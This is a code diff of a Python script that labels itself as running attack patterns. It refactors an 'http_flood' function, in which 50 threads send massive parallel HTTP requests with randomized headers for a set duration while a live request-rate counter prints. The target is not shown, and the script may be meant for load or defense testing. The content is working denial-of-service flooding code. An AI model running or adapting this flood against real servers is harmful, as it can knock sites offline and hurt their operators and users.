@@ -17,7 +17,7 @@ Attack Types:
     all     - Run all attack patterns sequentially
 """
 
-import requests
+import requests  # type: ignore
 import threading
 import time
 import random
@@ -61,13 +61,11 @@ def http_flood(duration=30, threads=50):
     print("\n🔴 [ATTACK] HTTP Flood — Sending massive parallel requests...")
     print(f"   Duration: {duration}s | Threads: {threads}")
     
-    count = 0
-    errors = 0
+    stats = {"count": 0, "errors": 0}
     start = time.time()
     stop_flag = threading.Event()
 
     def flood_worker():
-        nonlocal count, errors
         session = requests.Session()
         while not stop_flag.is_set():
             try:
@@ -79,24 +77,24 @@ def http_flood(duration=30, threads=50):
                     headers=random_headers(),
                     timeout=2,
                 )
-                count += 1
+                stats["count"] += 1
             except:
-                errors += 1
+                stats["errors"] += 1
             
     with ThreadPoolExecutor(max_workers=threads) as pool:
-        futures = [pool.submit(flood_worker) for _ in range(threads)]
+        futures = [pool.submit(flood_worker) for _ in range(threads)]  # type: ignore
         
         while time.time() - start < duration:
             elapsed = time.time() - start
-            rate = count / max(elapsed, 0.1)
-            print(f"\r   ⚡ Requests: {count:,} | Rate: {rate:.0f} req/s | Errors: {errors} | Time: {elapsed:.0f}s/{duration}s", end="", flush=True)
+            rate = stats["count"] / max(elapsed, 0.1)
+            print(f"\r   ⚡ Requests: {stats['count']:,} | Rate: {rate:.0f} req/s | Errors: {stats['errors']} | Time: {elapsed:.0f}s/{duration}s", end="", flush=True)
             time.sleep(0.5)
         
         stop_flag.set()
     
     total_time = time.time() - start
-    print(f"\n   ✅ Flood complete: {count:,} requests in {total_time:.1f}s ({count/total_time:.0f} req/s)")
-    return count
+    print(f"\n   ✅ Flood complete: {stats['count']:,} requests in {total_time:.1f}s ({stats['count']/total_time:.0f} req/s)")
+    return stats["count"]
 
 
 # ─────────────────────────────────────────────
